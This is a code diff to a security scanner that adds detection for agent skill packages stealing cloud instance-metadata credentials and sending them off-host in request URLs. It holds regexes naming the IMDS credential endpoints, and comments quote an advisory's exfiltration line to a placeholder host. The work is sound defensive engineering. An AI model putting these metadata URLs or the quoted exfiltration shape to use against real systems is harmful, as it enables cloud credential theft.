@@ -13955,6 +13955,25 @@ _B339_CRED_URL_RE = re.compile(
     re.IGNORECASE,
 )
 
+# B-1011: the BARE AWS/Alibaba `security-credentials/` listing -- the URL
+# real IMDS-theft code actually writes down. The listing returns only the role name,
+# so the minting URL is assembled at runtime (`LISTING + role`) and never appears
+# literally; `_B339_CRED_URL_RE` above (deliberately, C-135 round 1) never matches it,
+# so the `@ifasn/*-doc-mcp` family (GHSA-rvw8-22w3-342v and siblings) produced no
+# B339 at all. The listing is still NOT a finding on its own -- it is ordinary role
+# detection, exactly the clean fixture's shape. It counts only when either (a) the same
+# code builds a follow-up URL from it (WARN, `_b339_listing_followup`), or (b) the
+# fetched metadata response visibly leaves the host through an outbound call
+# (FAIL, network legs only -- see `_b339_corroborated(network_only=True)`). The
+# terminator lookahead keeps it disjoint from `_B339_CRED_URL_RE`: a role segment
+# (`/MyRole`, `/$ROLE`, `/{role}`) after the slash is the existing regex's match.
+_B339_LISTING_URL_RE = re.compile(
+    r"(?:169\.254\.169\.254[^\s\"'`]*?/latest/meta-data/iam"
+    r"|100\.100\.100\.200[^\s\"'`]*?/latest/meta-data/ram)"
+    r"/security-credentials/(?=[\"'`\s)\]]|$)",
+    re.IGNORECASE,
+)
+
 
 # B-398 round 2 (independent C-135 review found round 1's design unsound -- see
 # below): what happens to the token AFTER the fetch, not the fetch itself, is the
@@ -13999,8 +14018,9 @@ _B339_ASSIGN_LOOKBACK = 120
 # the corroborator searched for the wrong variable and silently missed a real exfil).
 # A statement-level assignment starts a line (or follows `;`); a kwarg is preceded by
 # `(` or `, ` inside a call's argument list -- this excludes the latter.
+_B339_DECL_KW = r"(?:(?:export[^\S\n]+)?(?:const|let|var|local|readonly|declare)[^\S\n]+)?"
 _B339_VAR_ASSIGN_RE = re.compile(
-    rf"(?:^|[\n;])[^\S\n]*({_B339_VAR_NAME_RE})\s*=\s*\$?\(?", re.MULTILINE
+    rf"(?:^|[\n;])[^\S\n]*{_B339_DECL_KW}({_B339_VAR_NAME_RE})\s*=\s*\$?\(?", re.MULTILINE
 )
 
 _B339_CORROBORATOR_WINDOW = 300  # chars AFTER the credential-URL match to look for misuse
@@ -14268,7 +14288,480 @@ def _b339_credential_persisted(window: str, varname: str) -> bool:
     return False
 
 
-def _b339_corroborated(norm: str, match_start: int, match_end: int, own_host) -> str | None:
+# ---------- B339 / B-1011: the URL-query exfil leg ----------------------
+#
+# `_b339_credential_as_payload` models the metadata response leaving as a call's BODY
+# (`json=`/`data=`/`-d`). The `@ifasn/*-doc-mcp` family sends it in the request URL
+# instead -- `get("http://<ip>.nip.io/?stage=report&nodes=" + encodeURIComponent(out))`
+# -- which that leg never saw, so even a literal-role fetch stayed WARN. This leg asks
+# the same data-flow question of the URL: does the fetched value (or a name derived from
+# it inside a short, bounded window) end up inside an outbound call's URL string -- by
+# `+` concatenation, a JS template `${...}`, a Python f-string/`%`/`.format`, a shell
+# `$VAR` inside the URL word, or a `params=` argument?
+#
+# Why the URL and not the header is the discriminator: the keyless-auth flows B-398
+# protects put the token in an `Authorization` HEADER -- a header value is never an
+# `http(s)://` literal, so none of the shapes below can fire on it. A destination that
+# is itself a metadata host (`LISTING + role`, the follow-up fetch), loopback, or the
+# skill's own declared host is not an off-host leak and never corroborates.
+#
+# The destination's SHAPE (a bare IP, a wildcard-DNS alias like nip.io) is deliberately
+# NOT consulted: it is not needed for the conviction (the data flow is), and making it a
+# requirement would only teach an attacker to use an ordinary domain.
+#
+# Taint propagation is one forward pass over at most `_B339_QUERY_WINDOW` characters,
+# statement by statement (split on newline/`;`): a loop variable iterating a tainted
+# name, an assignment whose right side mentions one, or a `.push/.append/.extend/.add`
+# whose argument does, taints the new name; an assignment whose right side does not
+# un-taints it. That is intentionally the smallest set that follows the advisory's own
+# shape (URL array -> loop -> push(fetch(u)) -> join -> query) without becoming general
+# data-flow analysis.
+_B339_QUERY_WINDOW = 600
+_B339_BRACKET_LOOKBACK = 1500
+_B339_STMT_SPLIT_RE = re.compile(r"[\n;]")
+_B339_LOOP_VAR_RE = re.compile(
+    rf"\bfor\b[^\S\n]*\(?[^\S\n]*(?:const|let|var)?[^\S\n]*({_B339_VAR_NAME_RE})[^\S\n]+(?:of|in)\b"
+)
+_B339_STMT_ASSIGN_RE = re.compile(
+    rf"^[^\S\n]*{_B339_DECL_KW}({_B339_VAR_NAME_RE})[^\S\n]*(?:\+=|=(?!=))"
+)
+_B339_COLLECT_RE = re.compile(rf"\b({_B339_VAR_NAME_RE})\.(?:push|append|extend|add)\s*\(")
+# Outbound calls whose FIRST argument is a URL -- GET-capable, unlike
+# `_B339_OUTBOUND_CALL_RE`, which only needs body-carrying verbs.
+_B339_URL_CALL_RE = re.compile(
+    r"\bhttps?\.(?:get|request)\s*\(|\bfetch\s*\(|\baxios(?:\.(?:get|post|put|request))?\s*\(|"
+    r"\b(?:requests|httpx|session)\.(?:get|post|put|patch|head|request)\s*\(|\burlopen\s*\(|"
+    r"\bRequest\s*\(|\bgot(?:\.(?:get|post))?\s*\(|\bcurl\b|\bwget\b|"
+    r"\bInvoke-(?:WebRequest|RestMethod)\b",
+    re.I,
+)
+_B339_URL_CALL_ARGS_WINDOW = 240
+_B339_METADATA_OR_LOCAL_HOST_RE = re.compile(
+    r"^(?:169\.254\.\d{1,3}\.\d{1,3}|100\.100\.100\.200|metadata\.google\.internal|metadata|"
+    r"127\.\d{1,3}\.\d{1,3}\.\d{1,3}|localhost|0\.0\.0\.0|\[?::1\]?|\[?fd00:ec2::254\]?)$",
+    re.I,
+)
+
+
+def _b339_url_shapes(names: "set[str]") -> "list[re.Pattern]":
+    """Patterns for a URL string that carries one of *names*; group 1 is the URL text
+    up to the tainted reference (for the host), or a `$VAR` to resolve for shell."""
+    if not names:
+        return []
+    alt = "|".join(re.escape(n) for n in sorted(names))
+    return [
+        # "http://h/?q=" + x   /   "http://h/" + encode(x.join("|"))
+        re.compile(rf"([\"'])(https?://[^\"'\s]*)\1\s*\+\s*[^;\n,)]{{0,120}}?\b(?:{alt})\b"),
+        # "http://h/?q=%s" % x   /   "http://h/?q={{}}".format(x)
+        re.compile(
+            rf"([\"'])(https?://[^\"'\s]*)\1\s*(?:%\s*\(?|\.format\s*\()[^;\n)]{{0,120}}?\b(?:{alt})\b"
+        ),
+        # `http://h/?q=${x}`   /   f"http://h/?q={x}"
+        re.compile(rf"(`)(https?://[^`\s]*?)\$\{{[^}}`]*\b(?:{alt})\b"),
+        re.compile(rf"\b[fF][rR]?([\"'])(https?://[^\"'\n]*?)\{{[^}}\"'\n]*\b(?:{alt})\b"),
+        # shell: http://h/?q=$X  /  ${X}  inside the same URL word
+        re.compile(rf"()(https?://[^\s\"'`]*?)\$\{{?(?:{alt})\b"),
+        # shell, host from a variable: "$HOST/?q=$X"
+        re.compile(rf"()(\$\{{?{_B339_VAR_NAME_RE}\}}?[^\s\"'`$]*)\$\{{?(?:{alt})\b"),
+    ]
+
+
+def _b339_query_seed(norm: str, match_start: int) -> "str | None":
+    """The name to start tainting from: the statement's assignment target
+    (`_b339_response_variable`), else the collection an inline fetch is pushed into
+    (`out.push(await fetch("<url>"))`), else the variable whose still-open bracket
+    literal holds the URL (`const NODES = [\n "<url1>",\n "<url2>" ...`)."""
+    v = _b339_response_variable(norm, match_start)
+    if v is not None:
+        return v
+    stmt_start = max(norm.rfind("\n", 0, match_start), norm.rfind(";", 0, match_start)) + 1
+    cm = _B339_COLLECT_RE.search(norm, stmt_start, match_start)
+    if cm is not None:
+        return cm.group(1)
+    lookback = norm[max(0, match_start - _B339_BRACKET_LOOKBACK) : match_start]
+    best = None
+    for m in re.finditer(
+        rf"(?:^|[\n;])[^\S\n]*{_B339_DECL_KW}({_B339_VAR_NAME_RE})\s*=\s*[\[(]", lookback, re.M
+    ):
+        tail = lookback[m.end() :]
+        depth = 1 + tail.count("[") + tail.count("(") - tail.count("]") - tail.count(")")
+        if depth > 0:
+            best = m
+    return best.group(1) if best is not None else None
+
+
+# Fail-closed: the seed holds the metadata URL itself only when everything between
+# its binding and the URL is a pure literal -- an optional opening bracket, earlier
+# string elements, separators and the URL's own opening quote/scheme
+# (`NODES = ["<a>", "<b>"`, `LIST = "<url>"`, `urls.push("<url>"`, a bash array).
+# Anything else (a call in any spelling: `get(`, `)(`, `?.(`, `$(`, a backtick) keeps
+# the seed a fetched response, so an unusual call shape can never downgrade it.
+_B339_PURE_LITERAL_PREFIX_RE = re.compile(
+    r"\s*(?:[\[(]\s*)?(?:(?P<q>[\"'])[^\"'`\n]*(?P=q)\s*(?:,\s*)?)*[\"']?(?:https?://)?\Z"
+)
+
+
+def _b339_seed_holds_url(norm: str, match_start: int, seed: str) -> bool:
+    """True when *seed* is bound to the metadata URL itself, not to a fetch result.
+    C-135 round 1 on B-1011: `for u in [LISTING]: get("https://x/?probe=" + u)` sends
+    the URL, not a metadata response, and used to FAIL."""
+    lookback = norm[max(0, match_start - _B339_BRACKET_LOOKBACK) : match_start]
+    bind = None
+    for m in re.finditer(rf"\b{re.escape(seed)}\s*(?:=(?!=)|\.(?:push|append|extend|add)\s*\()", lookback):
+        bind = m
+    if bind is None:
+        return False
+    return _B339_PURE_LITERAL_PREFIX_RE.match(lookback, bind.end()) is not None
+
+
+def _b339_offhost_url(norm: str, pos: int, url_text: str, own_host) -> "str | None":
+    """*url_text* (a literal `http(s)://...` prefix or a `$HOST...` shell prefix) as a
+    URL when it points off-host -- not a metadata/loopback address and not the skill's
+    own host; None otherwise, including when a `$HOST` cannot be resolved (an
+    unresolvable shell destination is not proof of an external one)."""
+    if url_text.startswith("$"):
+        vm = _B339_SHELL_VAR_REF_RE.match(url_text)
+        resolved = _b339_resolve_shell_var(norm, pos, vm.group(1)) if vm else None
+        if resolved is None or not resolved.lower().startswith(("http://", "https://")):
+            return None
+        url_text = resolved
+    hm = _URL_HOST_RE.match(url_text)
+    if hm is None:
+        return None
+    host = hm.group(1)
+    if _B339_METADATA_OR_LOCAL_HOST_RE.match(host) or _url_matches_own_host(url_text, own_host):
+        return None
+    return url_text
+
+
+def _b339_names_re(names: "set[str]") -> "re.Pattern":
+    return re.compile(rf"\b(?:{'|'.join(re.escape(n) for n in sorted(names))})\b")
+
+
+_B339_PARAMS_KW_RE = re.compile(r"\bparams\s*=\s*")
+
+
+def _b339_params_arg(seg: str, start: int) -> str:
+    """The text of the single `params=` argument beginning at *start*: a balanced
+    bracket literal, else a bare expression up to the next `,`/`)`. Bounded so a later
+    `headers=...` argument in the same call is never read as part of it (C-135 round 1
+    on B-1011: `params={"page": 1}, headers={"A": token}` used to FAIL).
+
+    Ends at the first `,`/`)` at bracket depth 0, so a bare call such as
+    `params=dict(a=1, t=tok)` keeps its own commas. Quoted strings are skipped while
+    counting, so a bracket or comma inside a string literal cannot end the argument
+    early. When the end is never found (truncated segment, unbalanced text), the rest
+    of the segment is returned -- reading too much here can only cost a WARN->FAIL on
+    a real tainted name, never hide one."""
+    return seg[start : _b339_arg_end(seg, start, stop_at_comma=True)]
+
+
+def _b339_arg_end(text: str, start: int, stop_at_comma: bool) -> int:
+    """Index where the argument (or, with *stop_at_comma* False, the whole argument
+    list) that begins at *start* ends: the first unmatched closing bracket, or a
+    depth-0 comma. String literals -- `"`, `'`, backtick and Python triple quotes --
+    are skipped, so brackets and commas inside them never count. Returns `len(text)`
+    when no end is found."""
+    depth = 0
+    quote = ""
+    k = start
+    n = len(text)
+    while k < n:
+        ch = text[k]
+        if quote:
+            if ch == "\\":
+                k += 2
+                continue
+            if text.startswith(quote, k):
+                k += len(quote)
+                quote = ""
+                continue
+        elif ch in "\"'`":
+            quote = ch * 3 if ch != "`" and text.startswith(ch * 3, k) else ch
+            k += len(quote)
+            continue
+        elif ch in "{([":
+            depth += 1
+        elif ch in "})]":
+            if depth == 0:
+                return k
+            depth -= 1
+        elif ch == "," and depth == 0 and stop_at_comma:
+            return k
+        k += 1
+    return n
+
+
+def _b339_in_network_call(text: str, names: "set[str]") -> bool:
+    """True when one of *names* sits anywhere inside the arguments of an outbound call
+    in *text* -- positional, keyword (`url=u`), interpolated (`` `${u}` ``, `f"{u}"`),
+    or after a command form (`curl $u`, `Invoke-RestMethod -Uri $u`)."""
+    if not names:
+        return False
+    names_re = _b339_names_re(names)
+    for call_m in _B339_URL_CALL_RE.finditer(text):
+        if call_m.group(0).endswith("("):
+            args = text[call_m.end() : _b339_arg_end(text, call_m.end(), stop_at_comma=False)]
+        else:
+            nl = text.find("\n", call_m.end())
+            args = text[call_m.end() : nl if nl != -1 else len(text)]
+        if names_re.search(args):
+            return True
+    return False
+
+
+# Callees known to only RESHAPE a string (encode, measure, parse, log), never fetch
+# it. C-135 round 2 on B-1011: `encodeURIComponent(u)`, `str(u)`, `len(u)`,
+# `new URL(u).host`, `urlparse(u).netloc`, `sanitize(u)` turned the URL STRING into a
+# "response" and FAILed code that only reports which endpoint it probes. Fail-closed
+# everywhere else: any other callee -- including computed ones (`)(u)`, `x[k](u)`,
+# `f?.(u)`) -- counts as a fetch, so an unfamiliar wrapper can never hide one.
+_B339_PURE_CALLEE_RE = re.compile(
+    r"(?:encodeURIComponent|encodeURI|decodeURIComponent|decodeURI|escape|unescape|quote|"
+    r"quote_plus|unquote|urlencode|str|String|repr|len|int|float|bool|print|log|info|debug|"
+    r"warn|warning|error|URL|urlparse|urlsplit|sanitize|normalize|trim|strip|lower|upper|"
+    r"toString|toLowerCase|toUpperCase|stringify|dumps|format|join|split|replace|basename|"
+    r"dirname)\Z"
+)
+
+
+def _b339_fetches(text: str, url_names: "set[str]") -> bool:
+    """True when *text* passes a URL-holding name to a call or a command -- the step
+    that turns a metadata URL into a metadata response: a known outbound call with the
+    name ANYWHERE in its arguments, a `curl`/`wget`/`iwr`/`irm` command naming it, or
+    any other call with the name as its first argument unless the callee is a known
+    pure string function (`_B339_PURE_CALLEE_RE`)."""
+    if not url_names:
+        return False
+    alt = "|".join(re.escape(n) for n in sorted(url_names))
+    if _b339_in_network_call(text, url_names):
+        return True
+    if re.search(rf"\b(?:curl|wget|iwr|irm)\b[^\n;]*\$\{{?(?:{alt})\b", text):
+        return True
+    for m in re.finditer(
+        rf"(?:(?<![\w$])([A-Za-z_$][\w$]*)|[\])])\s*(?:\?\.)?\s*\(\s*(?:await\s+)?(?:{alt})\b", text
+    ):
+        if m.group(1) is None or not _B339_PURE_CALLEE_RE.match(m.group(1)):
+            return True
+    return False
+
+
+# Deliberately NO status exemption of any kind. A health check that reports only a
+# status/boolean (`get(u).status_code`, `r.ok`, `curl -o /dev/null -w "%{http_code}"`)
+# reads statically like the response leaving the host, and every discriminator tried
+# on B-1011 -- attribute masking, a statement-tail match, curl flag/span parsing --
+# was broken by an automated review round (decoys in comments or second commands,
+# writes into the response object, aliasing, chained reads). Same class as a length
+# or expiry derived from the response: any value derived from a metadata response in
+# an off-host URL is a FAIL, the fail-closed direction. A sound split would need real
+# data-flow (and, for curl, `curlargv.py`), not another heuristic.
+
+
+# A plain string literal -- quoted, no prefix letter, nothing that could interpolate
+# (`$`, `{`) -- carries no variable's VALUE, so a tainted name spelled inside one
+# (`params={"role": "admin"}`, `"/" + "data/list"`) is not the name being sent
+# (C-135 round 4 on B-1011). A scanner, not a regex: every literal -- prefixed
+# (`f"..."`, `rb'...'`), triple-quoted or backtick -- is consumed as one unit, so its
+# closing quote can never pair with the next literal's opening one and blank the code
+# between them. Only unprefixed, non-interpolating literals are blanked; an
+# unbalanced quote leaves the text untouched (fail-closed).
+# A literal is blanked only when it sits where an expression operand can: after an
+# operator/opening bracket/start, and before an operator/closing bracket/separator/end.
+# A quote that does not (a shell apostrophe, a regex literal) leaves the span as is.
+_B339_LITERAL_OPENERS = frozenset(["", "(", "[", "{", ",", "=", ":", "+", "%", "?"])
+_B339_LITERAL_CLOSERS = frozenset(["", ")", "]", "}", ",", ":", "+", "%", ";", "."])
+# ...and only when its body is ONE word/path token (`"role"`, `"admin"`,
+# `"role/list"`): no whitespace, operator, bracket, quote, escape or interpolation
+# marker. A blacklist of code characters was still steerable (stray regex-literal
+# quotes pairing across live code); a mis-paired span across code always contains
+# whitespace or an operator, so it is never blanked (fail-closed).
+_B339_INERT_BODY_RE = re.compile(r"[\w./:@-]*")
+
+
+def _b339_blank_plain_strings(text: str) -> str:
+    out = list(text)
+    n = len(text)
+    k = 0
+    while k < n:
+        ch = text[k]
+        if ch not in "\"'`":
+            k += 1
+            continue
+        prefixed = k > 0 and (text[k - 1].isalnum() or text[k - 1] == "_")
+        quote = ch * 3 if ch != "`" and text.startswith(ch * 3, k) else ch
+        j = k + len(quote)
+        while j < n:
+            if text[j] == "\\":
+                j += 2
+                continue
+            if text.startswith(quote, j):
+                break
+            if text[j] == "\n" and len(quote) == 1 and ch != "`":
+                return text
+            j += 1
+        else:
+            return text
+        body = text[k + len(quote) : j]
+        before = text[:k].rstrip()[-1:]
+        after = text[j + len(quote) :].lstrip()[:1]
+        delimited = before in _B339_LITERAL_OPENERS and after in _B339_LITERAL_CLOSERS
+        if ch != "`" and not prefixed and delimited and _B339_INERT_BODY_RE.fullmatch(body):
+            for m in range(k + len(quote), j):
+                if out[m] != "\n":
+                    out[m] = " "
+        k = j + len(quote)
+    return "".join(out)
+
+
+# A statement that is only a line comment is not code: `#` not followed by an
+# identifier character (a JS `#private` field is code), or `//` followed by
+# whitespace or the end (`//usr/bin/curl ...` is a real shell command path).
+_B339_LINE_COMMENT_RE = re.compile(r"\s*(?:#(?![\w$])|//(?=\s|\Z))")
+
+
+def _b339_credential_in_url(
+    norm: str,
+    match_end: int,
+    seed: str,
+    own_host,
+    seed_holds_url: bool = False,
+) -> "str | None":
+    """The off-host destination when the metadata response named *seed* (or a name
+    tainted from it) reaches an outbound call's URL within `_B339_QUERY_WINDOW`; None
+    otherwise. See the block comment above for the propagation rules.
+
+    Two name sets are kept apart: `url_names` hold the metadata URL itself, `tainted`
+    hold what was fetched with it. A URL name becomes a response only when it is passed
+    to a call (`_b339_fetches`); only `tainted` names are ever checked at a sink."""
+    window = norm[match_end : match_end + _B339_QUERY_WINDOW]
+    tainted: "set[str]" = set() if seed_holds_url else {seed}
+    url_names: "set[str]" = {seed} if seed_holds_url else set()
+    url_vars: "dict[str, str]" = {}
+
+    def classify(text: str) -> "str | None":
+        text = _b339_blank_plain_strings(text)
+        if tainted and _b339_names_re(tainted).search(text):
+            return "resp"
+        if url_names and _b339_fetches(text, url_names):
+            return "fetched"
+        if url_names and _b339_names_re(url_names).search(text):
+            return "url"
+        return None
+
+    offset = 0
+    for stmt in _B339_STMT_SPLIT_RE.split(window):
+        stmt_pos = match_end + offset
+        offset += len(stmt) + 1
+        if not stmt.strip() or _B339_LINE_COMMENT_RE.match(stmt):
+            continue
+        lm = _B339_LOOP_VAR_RE.search(stmt)
+        if lm is not None:
+            kind = classify(stmt[lm.end() :])
+            if kind in ("resp", "fetched"):
+                tainted.add(lm.group(1))
+            elif kind == "url":
+                url_names.add(lm.group(1))
+            # No discard when the loop rebinds a tainted name to untainted values: a
+            # loop may run zero times, so the old binding can survive it (fail-closed).
+        am = _B339_STMT_ASSIGN_RE.match(stmt)
+        if am is not None:
+            target, rhs = am.group(1), stmt[am.end() :]
+            kind = classify(rhs)
+            if kind == "fetched":
+                tainted.add(target)
+            elif kind == "resp":
+                sources = tainted - {target}
+                tainted.add(target)
+                for shape in _b339_url_shapes(sources):
+                    um = shape.search(rhs)
+                    if um is not None:
+                        dest = _b339_offhost_url(norm, stmt_pos, um.group(2), own_host)
+                        if dest is not None:
+                            url_vars[target] = dest
+                        break
+            elif kind == "url":
+                url_names.add(target)
+            elif not stmt[am.end() - 2 : am.end()] == "+=":
+                tainted.discard(target)
+                url_names.discard(target)
+                url_vars.pop(target, None)
+        for cm in _B339_COLLECT_RE.finditer(stmt):
+            kind = classify(stmt[cm.end() :])
+            if kind in ("resp", "fetched"):
+                tainted.add(cm.group(1))
+            elif kind == "url":
+                url_names.add(cm.group(1))
+        if not tainted and not url_names:
+            return None
+        names_re = _b339_names_re(tainted) if tainted else None
+        shapes = _b339_url_shapes(tainted) if tainted else ()
+        # A URL name fetched INLINE inside the URL being built
+        # (`get("http://x/?d=" + enc(await (await fetch(u)).text()))`) never passes
+        # through an assignment, so it is checked here: the URL shape must reach the
+        # name through a nested outbound call (`_b339_in_network_call`), never by the
+        # bare name -- that bare case is the URL itself, the round-1 FP.
+        url_shapes = _b339_url_shapes(url_names) if url_names else ()
+        sink_stmt = stmt
+        for call_m in _B339_URL_CALL_RE.finditer(sink_stmt):
+            seg = sink_stmt[call_m.end() : call_m.end() + _B339_URL_CALL_ARGS_WINDOW]
+            for idx, shape in enumerate(shapes):
+                for um in shape.finditer(seg):
+                    # Concat / `%` / `.format` shapes: the name must sit OUTSIDE a plain
+                    # string literal (template/f-string/shell shapes interpolate it).
+                    # The whole argument expression is checked (to its depth-0 `,`/`)`),
+                    # so a decoy literal before the real name cannot end the match early.
+                    tail_lo = um.end(2) + 1
+                    tail = seg[tail_lo : _b339_arg_end(seg, tail_lo, stop_at_comma=True)]
+                    if idx < 2 and names_re is not None and not names_re.search(
+                        _b339_blank_plain_strings(tail)
+                    ):
+                        continue
+                    dest = _b339_offhost_url(norm, stmt_pos, um.group(2), own_host)
+                    if dest is not None:
+                        return dest
+                    break
+            for shape in url_shapes:
+                for um in shape.finditer(seg):
+                    if _b339_in_network_call(seg[um.end(2) :], url_names):
+                        dest = _b339_offhost_url(norm, stmt_pos, um.group(2), own_host)
+                        if dest is not None:
+                            return dest
+            params_args = [_b339_params_arg(seg, pm.end()) for pm in _B339_PARAMS_KW_RE.finditer(seg)]
+            if any(
+                (names_re is not None and names_re.search(_b339_blank_plain_strings(a))) or _b339_in_network_call(a, url_names)
+                for a in params_args
+            ):
+                url_m = _EXFIL_URL_RE.search(seg)
+                if url_m is not None:
+                    dest = _b339_offhost_url(norm, stmt_pos, url_m.group(0), own_host)
+                    if dest is not None:
+                        return dest
+            fm = re.match(rf"\s*({_B339_VAR_NAME_RE})\b", seg)
+            if fm is not None and fm.group(1) in url_vars:
+                return url_vars[fm.group(1)]
+    return None
+
+
+def _b339_listing_followup(norm: str, match_start: int, match_end: int) -> bool:
+    """True when a bare-listing URL is used to BUILD the minting URL: the literal is
+    concatenated on the spot (`"...security-credentials/" + role`), or the name holding
+    it is later concatenated/interpolated (`LISTING + role`, `${LISTING}${role}`,
+    `"$LISTING$ROLE"`) within `_B339_QUERY_WINDOW`."""
+    if re.match(r"[\"'`]\s*\+", norm[match_end : match_end + 8]):
+        return True
+    v = _b339_response_variable(norm, match_start)
+    if v is None:
+        return False
+    window = norm[match_end : match_end + _B339_QUERY_WINDOW]
+    ve = re.escape(v)
+    return bool(
+        re.search(rf"\b{ve}\s*\+|\$\{{{ve}\}}\$|\{{{ve}\}}\{{|\$\{{?{ve}\}}?\$", window)
+    )
+
+
+def _b339_corroborated(
+    norm: str, match_start: int, match_end: int, own_host, network_only: bool = False
+) -> str | None:
     """The corroboration reason (a short label) when the credential URL match has
     real, nearby evidence of misuse -- the fetched credential VARIABLE flowing into
     an outbound call's payload, an instruction to disclose it through the agent's
@@ -14322,8 +14815,26 @@ def _b339_corroborated(norm: str, match_start: int, match_end: int, own_host) ->
                     host_m = _URL_HOST_RE.match(url)
                     host = host_m.group(1) if host_m is not None else url
                     return f"fetched credential forwarded to {host}"
-            if _b339_credential_persisted(disk_window, candidate):
+            if not network_only and _b339_credential_persisted(disk_window, candidate):
                 return "fetched credential persisted to disk"
+    # B-1011: the URL-query/path leg (block comment above
+    # `_B339_QUERY_WINDOW`) -- seeded more permissively than the legs above (inline
+    # push, open bracket literal), because the advisory shape keeps its URLs in an array.
+    seed = _b339_query_seed(norm, match_start)
+    if seed is not None:
+        dest = _b339_credential_in_url(
+            norm,
+            match_end,
+            seed,
+            own_host,
+            _b339_seed_holds_url(norm, match_start, seed),
+        )
+        if dest is not None:
+            host_m = _URL_HOST_RE.match(dest)
+            host = host_m.group(1) if host_m is not None else dest
+            return f"fetched metadata response sent to {host} inside the request URL"
+    if network_only:
+        return None
     disclose_window = norm[
         max(0, match_start - _B339_DISCLOSE_WINDOW) : match_end + _B339_DISCLOSE_WINDOW
     ]
@@ -14470,6 +14981,19 @@ def check_cloud_metadata_credential_fetch(ctx: Context) -> Finding:
                 fail_ev.append(f'{skill_name}: "{snippet}" ({reason})')
             elif not whole_doc_dampened:
                 warn_ev.append(f'{skill_name}: "{snippet}"')
+        # B-1011: the bare listing (see `_B339_LISTING_URL_RE`). Network
+        # legs only -- "show the user the role name" or caching it to disk is ordinary
+        # role detection, not a credential leak; sending the metadata response
+        # off-host is not.
+        for m in _B339_LISTING_URL_RE.finditer(norm):
+            if _b339_defensive_context(norm, m.start(), fr):
+                continue
+            snippet = _obf_clip(norm[max(0, m.start() - 10) : m.end() + 10], 100)
+            reason = _b339_corroborated(norm, m.start(), m.end(), own_host, network_only=True)
+            if reason is not None:
+                fail_ev.append(f'{skill_name}: "{snippet}" ({reason})')
+            elif not whole_doc_dampened and _b339_listing_followup(norm, m.start(), m.end()):
+                warn_ev.append(f'{skill_name}: "{snippet}" (role listing used to build the credential URL)')
 
     if fail_ev:
         ev_summary = "; ".join(fail_ev[:4])
